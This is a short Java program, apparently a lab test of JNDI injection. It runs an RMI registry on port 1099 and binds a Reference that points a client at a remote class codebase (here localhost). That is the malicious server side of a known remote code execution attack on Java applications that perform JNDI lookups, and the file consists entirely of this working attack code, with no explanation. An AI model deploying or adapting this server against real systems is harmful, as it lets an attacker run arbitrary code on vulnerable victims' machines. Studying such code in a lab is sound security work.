package jndi_test1;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("testObject", "testObject", "http://127.0.0.1/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("testObject", wrapper);
        System.out.println("run in 1099");
    }
}
